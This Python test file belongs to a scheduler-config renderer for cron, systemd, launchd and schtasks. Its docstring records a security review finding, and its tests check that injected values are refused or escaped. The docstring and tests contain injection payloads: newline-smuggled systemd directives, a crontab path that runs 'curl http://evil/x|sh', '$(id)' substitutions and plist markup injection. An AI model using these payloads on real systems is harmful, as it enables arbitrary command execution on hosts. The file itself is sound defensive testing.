"""No render may write a directive the context did not ask for.

Review finding (2026-09-19): only the schtasks adapter had a guard
(`refuse_hostile_cmd_paths`). The cron, systemd and launchd renders interpolated
`$AWRISE_HOME` and `$USER` -- neither validated anywhere -- straight into files
another program PARSES. Verified by render at the time:

* `user="bob\nExecStartPre=/bin/sh -c 'curl http://evil/x|sh'"` put that line
  inside `[Service]` in a unit `--systemd-system` installs at /etc/systemd/system;
* `home='/tmp/h";curl http://evil/x|sh;#'` produced
  `AWRISE_HOME="/tmp/h";curl http://evil/x|sh;#" ...` in the crontab line --
  arbitrary shell run every minute as the owner;
* a home holding `</string></dict><key>x</key><string>&` went into the launchd
  plist verbatim (and a legitimate bare `&` made it invalid XML).
"""

import xml.dom.minidom

import pytest
from awrise import hostclock

POSIX_KINDS = ("cron", "systemd-user", "systemd-system", "launchd")


def _ctx(**over) -> hostclock.Context:
    base = dict(
        python="/usr/bin/python3",
        home="/home/ada/.aither/awrise",
        bin_dir="/home/ada/.aither/awrise/bin",
        log_path="/home/ada/.aither/awrise/logs/run-due.log",
        every_s=60,
        user="ada",
        version="0.2.0",
        sep="/",
    )
    base.update(over)
    return hostclock.Context(**base)


@pytest.mark.parametrize("kind", hostclock.KINDS)
@pytest.mark.parametrize(
    "field",
    ("home", "bin_dir", "log_path", "python", "user"),
)
def test_a_newline_in_any_field_is_refused_by_every_adapter(kind, field):
    sep = "\\" if kind == "schtasks" else "/"
    hostile = "ada\nExecStartPre=/bin/sh -c 'curl http://evil/x|sh'"
    ctx = _ctx(sep=sep, **{field: hostile})
    with pytest.raises(hostclock.HostClockError) as caught:
        hostclock.render(kind, ctx)
    assert caught.value.code == 2
    assert "control character" in str(caught.value) or "directive" in str(caught.value)


def test_a_systemd_unit_never_gains_a_directive_from_the_user_name():
    """The shape the finding named, asserted on the rendered text itself."""
    with pytest.raises(hostclock.HostClockError):
        hostclock.render("systemd-system", _ctx(user="bob\nExecStartPre=/bin/sh -c 'x'"))
    # A user name that is merely not a user name is refused too: a value with
    # no newline can still be a word systemd reads as something else.
    with pytest.raises(hostclock.HostClockError) as caught:
        hostclock.render("systemd-system", _ctx(user="bob and friends"))
    assert "not a user name" in str(caught.value)
    text = hostclock.render("systemd-system", _ctx(user="ada"))["awrise.service"]
    assert "User=ada" in text
    assert len([ln for ln in text.splitlines() if ln.startswith("ExecStart")]) == 1


def test_a_cron_line_cannot_be_closed_by_the_home_path():
    for hostile in ('/tmp/h";curl http://evil/x|sh;#', "/tmp/$(id)", "/tmp/`id`", "/tmp/50%off"):
        with pytest.raises(hostclock.HostClockError) as caught:
            hostclock.render("cron", _ctx(home=hostile))
        assert caught.value.code == 2, hostile
    line = hostclock.render("cron", _ctx())["crontab-line"]
    assert line.count('"') == 4, line
    assert line.rstrip().endswith(hostclock.CRON_MARKER)


def test_a_launchd_plist_stays_one_well_formed_document():
    hostile = "/tmp/h</string></dict><key>RunAtLoad</key><true/><dict><string>x&y"
    plist = hostclock.render("launchd", _ctx(home=hostile))[hostclock.LAUNCHD_LABEL + ".plist"]
    # It parses (a bare '&' alone used to make it malformed) ...
    parsed = xml.dom.minidom.parseString(plist)
    # ... and the hostile text is DATA, not markup: the document still has the
    # keys this module wrote and no others.
    keys = [node.firstChild.data for node in parsed.getElementsByTagName("key")]
    assert keys == [
        "Label",
        "ProgramArguments",
        "EnvironmentVariables",
        "AWRISE_HOME",
        "StartInterval",
        "RunAtLoad",
        "StandardOutPath",
        "StandardErrorPath",
    ], keys
    values = [node.firstChild.data for node in parsed.getElementsByTagName("string")]
    assert hostile in values, values


@pytest.mark.parametrize("kind", POSIX_KINDS)
def test_an_ordinary_context_still_renders(kind):
    """The negative twin: the guard refuses hostile input, not every input."""
    artifacts = hostclock.render(kind, _ctx())
    assert artifacts and all(text.strip() for text in artifacts.values())
